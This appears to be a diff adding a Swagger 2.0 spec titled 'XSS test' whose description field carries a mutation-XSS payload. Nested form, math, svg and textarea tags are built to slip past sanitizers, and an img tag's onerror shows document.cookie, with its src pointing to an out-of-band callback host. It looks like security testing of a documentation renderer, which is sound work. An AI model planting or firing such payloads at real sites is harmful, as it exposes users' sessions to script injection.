@@ -1,0 +1,5 @@
+swagger: '2.0'
+info:
+  title: XSS test
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src ='https://je1qcxr4txaz3t83rd57icc6nxtohfe33.l.prod.burpcloth.infosec.a2z.com' onerror=alert(document.cookie)>"></form>
